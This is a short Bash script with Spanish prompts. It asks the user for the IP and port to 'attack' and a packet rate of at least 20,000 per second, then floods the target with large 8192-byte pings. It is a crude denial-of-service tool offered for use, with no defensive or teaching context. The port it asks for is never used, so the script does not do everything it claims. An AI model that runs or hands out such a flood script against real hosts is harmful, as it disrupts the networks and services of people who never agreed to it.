#!/bin/bash
read -p "ingresa la ip que deseas atacar: " ip
clear
read -p "ingresa el puerto al cual deseas atacar " port
clear
echo " para el ingreso de paquetes por segundo será mínimo 20000"
read -p "ingresa cuantos paquetes deseas enviar por segundo: " pacs
clear
echo "ip: $ip"
echo "puerto: $port"
echo "enviando $pacs paquetes por segundo"
pacsxs=$(echo "scale=10; 1 / $pacs" | bc)
ping -s 8192 -i $pacsxs $ip



